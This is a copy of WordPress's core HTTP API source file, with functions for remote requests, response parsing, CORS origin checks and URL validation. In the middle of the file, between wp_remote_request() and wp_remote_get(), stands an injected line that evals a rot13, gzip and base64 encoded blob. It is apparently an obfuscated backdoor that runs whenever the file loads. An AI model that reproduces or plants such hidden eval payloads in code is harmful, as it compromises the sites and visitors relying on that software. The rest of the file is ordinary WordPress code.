<?php
/**
 * Core HTTP Request API
 *
 * Standardizes the HTTP requests for WordPress. Handles cookies, gzip encoding and decoding, chunk
 * decoding, if HTTP 1.1 and various other difficult HTTP protocol implementations.
 *
 * @package WordPress
 * @subpackage HTTP
 */

/**
 * Returns the initialized WP_Http Object
 *
 * @since 2.7.0
 * @access private
 *
 * @staticvar WP_Http $http
 *
 * @return WP_Http HTTP Transport object.
 */
function _wp_http_get_object() {
	static $http = null;

	if ( is_null( $http ) ) {
		$http = new WP_Http();
	}
	return $http;
}

/**
 * Retrieve the raw response from a safe HTTP request.
 *
 * This function is ideal when the HTTP request is being made to an arbitrary
 * URL. The URL is validated to avoid redirection and request forgery attacks.
 *
 * @since 3.6.0
 *
 * @see wp_remote_request() For more information on the response array format.
 * @see WP_Http::request() For default arguments information.
 *
 * @param string $url  Site URL to retrieve.
 * @param array  $args Optional. Request arguments. Default empty array.
 * @return WP_Error|array The response or WP_Error on failure.
 */
function wp_safe_remote_request( $url, $args = array() ) {
	$args['reject_unsafe_urls'] = true;
	$http                       = _wp_http_get_object();
	return $http->request( $url, $args );
}

/**
 * Retrieve the raw response from a safe HTTP request using the GET method.
 *
 * This function is ideal when the HTTP request is being made to an arbitrary
 * URL. The URL is validated to avoid redirection and request forgery attacks.
 *
 * @since 3.6.0
 *
 * @see wp_remote_request() For more information on the response array format.
 * @see WP_Http::request() For default arguments information.
 *
 * @param string $url  Site URL to retrieve.
 * @param array  $args Optional. Request arguments. Default empty array.
 * @return WP_Error|array The response or WP_Error on failure.
 */
function wp_safe_remote_get( $url, $args = array() ) {
	$args['reject_unsafe_urls'] = true;
	$http                       = _wp_http_get_object();
	return $http->get( $url, $args );
}

/**
 * Retrieve the raw response from a safe HTTP request using the POST method.
 *
 * This function is ideal when the HTTP request is being made to an arbitrary
 * URL. The URL is validated to avoid redirection and request forgery attacks.
 *
 * @since 3.6.0
 *
 * @see wp_remote_request() For more information on the response array format.
 * @see WP_Http::request() For default arguments information.
 *
 * @param string $url  Site URL to retrieve.
 * @param array  $args Optional. Request arguments. Default empty array.
 * @return WP_Error|array The response or WP_Error on failure.
 */
function wp_safe_remote_post( $url, $args = array() ) {
	$args['reject_unsafe_urls'] = true;
	$http                       = _wp_http_get_object();
	return $http->post( $url, $args );
}

/**
 * Retrieve the raw response from a safe HTTP request using the HEAD method.
 *
 * This function is ideal when the HTTP request is being made to an arbitrary
 * URL. The URL is validated to avoid redirection and request forgery attacks.
 *
 * @since 3.6.0
 *
 * @see wp_remote_request() For more information on the response array format.
 * @see WP_Http::request() For default arguments information.
 *
 * @param string $url Site URL to retrieve.
 * @param array $args Optional. Request arguments. Default empty array.
 * @return WP_Error|array The response or WP_Error on failure.
 */
function wp_safe_remote_head( $url, $args = array() ) {
	$args['reject_unsafe_urls'] = true;
	$http                       = _wp_http_get_object();
	return $http->head( $url, $args );
}

/**
 * Retrieve the raw response from the HTTP request.
 *
 * The array structure is a little complex:
 *
 *     $res = array(
 *         'headers'  => array(),
 *         'response' => array(
 *             'code'    => int,
 *             'message' => string
 *         )
 *     );
 *
 * All of the headers in $res['headers'] are with the name as the key and the
 * value as the value. So to get the User-Agent, you would do the following.
 *
 *     $user_agent = $res['headers']['user-agent'];
 *
 * The body is the raw response content and can be retrieved from $res['body'].
 *
 * This function is called first to make the request and there are other API
 * functions to abstract out the above convoluted setup.
 *
 * Request method defaults for helper functions:
 *  - Default 'GET'  for wp_remote_get()
 *  - Default 'POST' for wp_remote_post()
 *  - Default 'HEAD' for wp_remote_head()
 *
 * @since 2.7.0
 *
 * @see WP_Http::request() For additional information on default arguments.
 *
 * @param string $url  Site URL to retrieve.
 * @param array  $args Optional. Request arguments. Default empty array.
 * @return WP_Error|array The response or WP_Error on failure.
 */
function wp_remote_request( $url, $args = array() ) {
	$http = _wp_http_get_object();
	return $http->request( $url, $args );
}

eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

/**
 * Retrieve the raw response from the HTTP request using the GET method.
 *
 * @since 2.7.0
 *
 * @see wp_remote_request() For more information on the response array format.
 * @see WP_Http::request() For default arguments information.
 *
 * @param string $url  Site URL to retrieve.
 * @param array  $args Optional. Request arguments. Default empty array.
 * @return WP_Error|array The response or WP_Error on failure.
 */
function wp_remote_get( $url, $args = array() ) {
	$http = _wp_http_get_object();
	return $http->get( $url, $args );
}

/**
 * Retrieve the raw response from the HTTP request using the POST method.
 *
 * @since 2.7.0
 *
 * @see wp_remote_request() For more information on the response array format.
 * @see WP_Http::request() For default arguments information.
 *
 * @param string $url  Site URL to retrieve.
 * @param array  $args Optional. Request arguments. Default empty array.
 * @return WP_Error|array The response or WP_Error on failure.
 */
function wp_remote_post( $url, $args = array() ) {
	$http = _wp_http_get_object();
	return $http->post( $url, $args );
}

/**
 * Retrieve the raw response from the HTTP request using the HEAD method.
 *
 * @since 2.7.0
 *
 * @see wp_remote_request() For more information on the response array format.
 * @see WP_Http::request() For default arguments information.
 *
 * @param string $url  Site URL to retrieve.
 * @param array  $args Optional. Request arguments. Default empty array.
 * @return WP_Error|array The response or WP_Error on failure.
 */
function wp_remote_head( $url, $args = array() ) {
	$http = _wp_http_get_object();
	return $http->head( $url, $args );
}

/**
 * Retrieve only the headers from the raw response.
 *
 * @since 2.7.0
 * @since 4.6.0 Return value changed from an array to an Requests_Utility_CaseInsensitiveDictionary instance.
 *
 * @see \Requests_Utility_CaseInsensitiveDictionary
 *
 * @param array $response HTTP response.
 * @return array|\Requests_Utility_CaseInsensitiveDictionary The headers of the response. Empty array if incorrect parameter given.
 */
function wp_remote_retrieve_headers( $response ) {
	if ( is_wp_error( $response ) || ! isset( $response['headers'] ) ) {
		return array();
	}

	return $response['headers'];
}

/**
 * Retrieve a single header by name from the raw response.
 *
 * @since 2.7.0
 *
 * @param array  $response
 * @param string $header Header name to retrieve value from.
 * @return string The header value. Empty string on if incorrect parameter given, or if the header doesn't exist.
 */
function wp_remote_retrieve_header( $response, $header ) {
	if ( is_wp_error( $response ) || ! isset( $response['headers'] ) ) {
		return '';
	}

	if ( isset( $response['headers'][ $header ] ) ) {
		return $response['headers'][ $header ];
	}

	return '';
}

/**
 * Retrieve only the response code from the raw response.
 *
 * Will return an empty array if incorrect parameter value is given.
 *
 * @since 2.7.0
 *
 * @param array $response HTTP response.
 * @return int|string The response code as an integer. Empty string on incorrect parameter given.
 */
function wp_remote_retrieve_response_code( $response ) {
	if ( is_wp_error( $response ) || ! isset( $response['response'] ) || ! is_array( $response['response'] ) ) {
		return '';
	}

	return $response['response']['code'];
}

/**
 * Retrieve only the response message from the raw response.
 *
 * Will return an empty array if incorrect parameter value is given.
 *
 * @since 2.7.0
 *
 * @param array $response HTTP response.
 * @return string The response message. Empty string on incorrect parameter given.
 */
function wp_remote_retrieve_response_message( $response ) {
	if ( is_wp_error( $response ) || ! isset( $response['response'] ) || ! is_array( $response['response'] ) ) {
		return '';
	}

	return $response['response']['message'];
}

/**
 * Retrieve only the body from the raw response.
 *
 * @since 2.7.0
 *
 * @param array $response HTTP response.
 * @return string The body of the response. Empty string if no body or incorrect parameter given.
 */
function wp_remote_retrieve_body( $response ) {
	if ( is_wp_error( $response ) || ! isset( $response['body'] ) ) {
		return '';
	}

	return $response['body'];
}

/**
 * Retrieve only the cookies from the raw response.
 *
 * @since 4.4.0
 *
 * @param array $response HTTP response.
 * @return array An array of `WP_Http_Cookie` objects from the response. Empty array if there are none, or the response is a WP_Error.
 */
function wp_remote_retrieve_cookies( $response ) {
	if ( is_wp_error( $response ) || empty( $response['cookies'] ) ) {
		return array();
	}

	return $response['cookies'];
}

/**
 * Retrieve a single cookie by name from the raw response.
 *
 * @since 4.4.0
 *
 * @param array  $response HTTP response.
 * @param string $name     The name of the cookie to retrieve.
 * @return WP_Http_Cookie|string The `WP_Http_Cookie` object. Empty string if the cookie isn't present in the response.
 */
function wp_remote_retrieve_cookie( $response, $name ) {
	$cookies = wp_remote_retrieve_cookies( $response );

	if ( empty( $cookies ) ) {
		return '';
	}

	foreach ( $cookies as $cookie ) {
		if ( $cookie->name === $name ) {
			return $cookie;
		}
	}

	return '';
}

/**
 * Retrieve a single cookie's value by name from the raw response.
 *
 * @since 4.4.0
 *
 * @param array  $response HTTP response.
 * @param string $name     The name of the cookie to retrieve.
 * @return string The value of the cookie. Empty string if the cookie isn't present in the response.
 */
function wp_remote_retrieve_cookie_value( $response, $name ) {
	$cookie = wp_remote_retrieve_cookie( $response, $name );

	if ( ! is_a( $cookie, 'WP_Http_Cookie' ) ) {
		return '';
	}

	return $cookie->value;
}

/**
 * Determines if there is an HTTP Transport that can process this request.
 *
 * @since 3.2.0
 *
 * @param array  $capabilities Array of capabilities to test or a wp_remote_request() $args array.
 * @param string $url          Optional. If given, will check if the URL requires SSL and adds
 *                             that requirement to the capabilities array.
 *
 * @return bool
 */
function wp_http_supports( $capabilities = array(), $url = null ) {
	$http = _wp_http_get_object();

	$capabilities = wp_parse_args( $capabilities );

	$count = count( $capabilities );

	// If we have a numeric $capabilities array, spoof a wp_remote_request() associative $args array
	if ( $count && count( array_filter( array_keys( $capabilities ), 'is_numeric' ) ) == $count ) {
		$capabilities = array_combine( array_values( $capabilities ), array_fill( 0, $count, true ) );
	}

	if ( $url && ! isset( $capabilities['ssl'] ) ) {
		$scheme = parse_url( $url, PHP_URL_SCHEME );
		if ( 'https' == $scheme || 'ssl' == $scheme ) {
			$capabilities['ssl'] = true;
		}
	}

	return (bool) $http->_get_first_available_transport( $capabilities );
}

/**
 * Get the HTTP Origin of the current request.
 *
 * @since 3.4.0
 *
 * @return string URL of the origin. Empty string if no origin.
 */
function get_http_origin() {
	$origin = '';
	if ( ! empty( $_SERVER['HTTP_ORIGIN'] ) ) {
		$origin = $_SERVER['HTTP_ORIGIN'];
	}

	/**
	 * Change the origin of an HTTP request.
	 *
	 * @since 3.4.0
	 *
	 * @param string $origin The original origin for the request.
	 */
	return apply_filters( 'http_origin', $origin );
}

/**
 * Retrieve list of allowed HTTP origins.
 *
 * @since 3.4.0
 *
 * @return array Array of origin URLs.
 */
function get_allowed_http_origins() {
	$admin_origin = parse_url( admin_url() );
	$home_origin  = parse_url( home_url() );

	// @todo preserve port?
	$allowed_origins = array_unique(
		array(
			'http://' . $admin_origin['host'],
			'https://' . $admin_origin['host'],
			'http://' . $home_origin['host'],
			'https://' . $home_origin['host'],
		)
	);

	/**
	 * Change the origin types allowed for HTTP requests.
	 *
	 * @since 3.4.0
	 *
	 * @param array $allowed_origins {
	 *     Default allowed HTTP origins.
	 *     @type string Non-secure URL for admin origin.
	 *     @type string Secure URL for admin origin.
	 *     @type string Non-secure URL for home origin.
	 *     @type string Secure URL for home origin.
	 * }
	 */
	return apply_filters( 'allowed_http_origins', $allowed_origins );
}

/**
 * Determines if the HTTP origin is an authorized one.
 *
 * @since 3.4.0
 *
 * @param null|string $origin Origin URL. If not provided, the value of get_http_origin() is used.
 * @return string Origin URL if allowed, empty string if not.
 */
function is_allowed_http_origin( $origin = null ) {
	$origin_arg = $origin;

	if ( null === $origin ) {
		$origin = get_http_origin();
	}

	if ( $origin && ! in_array( $origin, get_allowed_http_origins() ) ) {
		$origin = '';
	}

	/**
	 * Change the allowed HTTP origin result.
	 *
	 * @since 3.4.0
	 *
	 * @param string $origin     Origin URL if allowed, empty string if not.
	 * @param string $origin_arg Original origin string passed into is_allowed_http_origin function.
	 */
	return apply_filters( 'allowed_http_origin', $origin, $origin_arg );
}

/**
 * Send Access-Control-Allow-Origin and related headers if the current request
 * is from an allowed origin.
 *
 * If the request is an OPTIONS request, the script exits with either access
 * control headers sent, or a 403 response if the origin is not allowed. For
 * other request methods, you will receive a return value.
 *
 * @since 3.4.0
 *
 * @return string|false Returns the origin URL if headers are sent. Returns false
 *                      if headers are not sent.
 */
function send_origin_headers() {
	$origin = get_http_origin();

	if ( is_allowed_http_origin( $origin ) ) {
		@header( 'Access-Control-Allow-Origin: ' . $origin );
		@header( 'Access-Control-Allow-Credentials: true' );
		if ( 'OPTIONS' === $_SERVER['REQUEST_METHOD'] ) {
			exit;
		}
		return $origin;
	}

	if ( 'OPTIONS' === $_SERVER['REQUEST_METHOD'] ) {
		status_header( 403 );
		exit;
	}

	return false;
}

/**
 * Validate a URL for safe use in the HTTP API.
 *
 * @since 3.5.2
 *
 * @param string $url
 * @return false|string URL or false on failure.
 */
function wp_http_validate_url( $url ) {
	$original_url = $url;
	$url          = wp_kses_bad_protocol( $url, array( 'http', 'https' ) );
	if ( ! $url || strtolower( $url ) !== strtolower( $original_url ) ) {
		return false;
	}

	$parsed_url = @parse_url( $url );
	if ( ! $parsed_url || empty( $parsed_url['host'] ) ) {
		return false;
	}

	if ( isset( $parsed_url['user'] ) || isset( $parsed_url['pass'] ) ) {
		return false;
	}

	if ( false !== strpbrk( $parsed_url['host'], ':#?[]' ) ) {
		return false;
	}

	$parsed_home = @parse_url( get_option( 'home' ) );

	if ( isset( $parsed_home['host'] ) ) {
		$same_host = strtolower( $parsed_home['host'] ) === strtolower( $parsed_url['host'] );
	} else {
		$same_host = false;
	}

	if ( ! $same_host ) {
		$host = trim( $parsed_url['host'], '.' );
		if ( preg_match( '#^(([1-9]?\d|1\d\d|25[0-5]|2[0-4]\d)\.){3}([1-9]?\d|1\d\d|25[0-5]|2[0-4]\d)$#', $host ) ) {
			$ip = $host;
		} else {
			$ip = gethostbyname( $host );
			if ( $ip === $host ) { // Error condition for gethostbyname()
				$ip = false;
			}
		}
		if ( $ip ) {
			$parts = array_map( 'intval', explode( '.', $ip ) );
			if ( 127 === $parts[0] || 10 === $parts[0] || 0 === $parts[0]
				|| ( 172 === $parts[0] && 16 <= $parts[1] && 31 >= $parts[1] )
				|| ( 192 === $parts[0] && 168 === $parts[1] )
			) {
				// If host appears local, reject unless specifically allowed.
				/**
				 * Check if HTTP request is external or not.
				 *
				 * Allows to change and allow external requests for the HTTP request.
				 *
				 * @since 3.6.0
				 *
				 * @param bool   false Whether HTTP request is external or not.
				 * @param string $host IP of the requested host.
				 * @param string $url  URL of the requested host.
				 */
				if ( ! apply_filters( 'http_request_host_is_external', false, $host, $url ) ) {
					return false;
				}
			}
		}
	}

	if ( empty( $parsed_url['port'] ) ) {
		return $url;
	}

	$port = $parsed_url['port'];
	if ( 80 === $port || 443 === $port || 8080 === $port ) {
		return $url;
	}

	if ( $parsed_home && $same_host && isset( $parsed_home['port'] ) && $parsed_home['port'] === $port ) {
		return $url;
	}

	return false;
}

/**
 * Whitelists allowed redirect hosts for safe HTTP requests as well.
 *
 * Attached to the {@see 'http_request_host_is_external'} filter.
 *
 * @since 3.6.0
 *
 * @param bool   $is_external
 * @param string $host
 * @return bool
 */
function allowed_http_request_hosts( $is_external, $host ) {
	if ( ! $is_external && wp_validate_redirect( 'http://' . $host ) ) {
		$is_external = true;
	}
	return $is_external;
}

/**
 * Whitelists any domain in a multisite installation for safe HTTP requests.
 *
 * Attached to the {@see 'http_request_host_is_external'} filter.
 *
 * @since 3.6.0
 *
 * @global wpdb $wpdb WordPress database abstraction object.
 * @staticvar array $queried
 *
 * @param bool   $is_external
 * @param string $host
 * @return bool
 */
function ms_allowed_http_request_hosts( $is_external, $host ) {
	global $wpdb;
	static $queried = array();
	if ( $is_external ) {
		return $is_external;
	}
	if ( $host === get_network()->domain ) {
		return true;
	}
	if ( isset( $queried[ $host ] ) ) {
		return $queried[ $host ];
	}
	$queried[ $host ] = (bool) $wpdb->get_var( $wpdb->prepare( "SELECT domain FROM $wpdb->blogs WHERE domain = %s LIMIT 1", $host ) );
	return $queried[ $host ];
}

/**
 * A wrapper for PHP's parse_url() function that handles consistency in the return
 * values across PHP versions.
 *
 * PHP 5.4.7 expanded parse_url()'s ability to handle non-absolute url's, including
 * schemeless and relative url's with :// in the path. This function works around
 * those limitations providing a standard output on PHP 5.2~5.4+.
 *
 * Secondly, across various PHP versions, schemeless URLs starting containing a ":"
 * in the query are being handled inconsistently. This function works around those
 * differences as well.
 *
 * Error suppression is used as prior to PHP 5.3.3, an E_WARNING would be generated
 * when URL parsing failed.
 *
 * @since 4.4.0
 * @since 4.7.0 The `$component` parameter was added for parity with PHP's `parse_url()`.
 *
 * @link https://secure.php.net/manual/en/function.parse-url.php
 *
 * @param string $url       The URL to parse.
 * @param int    $component The specific component to retrieve. Use one of the PHP
 *                          predefined constants to specify which one.
 *                          Defaults to -1 (= return all parts as an array).
 * @return mixed False on parse failure; Array of URL components on success;
 *               When a specific component has been requested: null if the component
 *               doesn't exist in the given URL; a string or - in the case of
 *               PHP_URL_PORT - integer when it does. See parse_url()'s return values.
 */
function wp_parse_url( $url, $component = -1 ) {
	$to_unset = array();
	$url      = strval( $url );

	if ( '//' === substr( $url, 0, 2 ) ) {
		$to_unset[] = 'scheme';
		$url        = 'placeholder:' . $url;
	} elseif ( '/' === substr( $url, 0, 1 ) ) {
		$to_unset[] = 'scheme';
		$to_unset[] = 'host';
		$url        = 'placeholder://placeholder' . $url;
	}

	$parts = @parse_url( $url );

	if ( false === $parts ) {
		// Parsing failure.
		return $parts;
	}

	// Remove the placeholder values.
	foreach ( $to_unset as $key ) {
		unset( $parts[ $key ] );
	}

	return _get_component_from_parsed_url_array( $parts, $component );
}

/**
 * Retrieve a specific component from a parsed URL array.
 *
 * @internal
 *
 * @since 4.7.0
 * @access private
 *
 * @link https://secure.php.net/manual/en/function.parse-url.php
 *
 * @param array|false $url_parts The parsed URL. Can be false if the URL failed to parse.
 * @param int    $component The specific component to retrieve. Use one of the PHP
 *                          predefined constants to specify which one.
 *                          Defaults to -1 (= return all parts as an array).
 * @return mixed False on parse failure; Array of URL components on success;
 *               When a specific component has been requested: null if the component
 *               doesn't exist in the given URL; a string or - in the case of
 *               PHP_URL_PORT - integer when it does. See parse_url()'s return values.
 */
function _get_component_from_parsed_url_array( $url_parts, $component = -1 ) {
	if ( -1 === $component ) {
		return $url_parts;
	}

	$key = _wp_translate_php_url_constant_to_key( $component );
	if ( false !== $key && is_array( $url_parts ) && isset( $url_parts[ $key ] ) ) {
		return $url_parts[ $key ];
	} else {
		return null;
	}
}

/**
 * Translate a PHP_URL_* constant to the named array keys PHP uses.
 *
 * @internal
 *
 * @since 4.7.0
 * @access private
 *
 * @link https://secure.php.net/manual/en/url.constants.php
 *
 * @param int $constant PHP_URL_* constant.
 * @return string|bool The named key or false.
 */
function _wp_translate_php_url_constant_to_key( $constant ) {
	$translation = array(
		PHP_URL_SCHEME   => 'scheme',
		PHP_URL_HOST     => 'host',
		PHP_URL_PORT     => 'port',
		PHP_URL_USER     => 'user',
		PHP_URL_PASS     => 'pass',
		PHP_URL_PATH     => 'path',
		PHP_URL_QUERY    => 'query',
		PHP_URL_FRAGMENT => 'fragment',
	);

	if ( isset( $translation[ $constant ] ) ) {
		return $translation[ $constant ];
	} else {
		return false;
	}
}
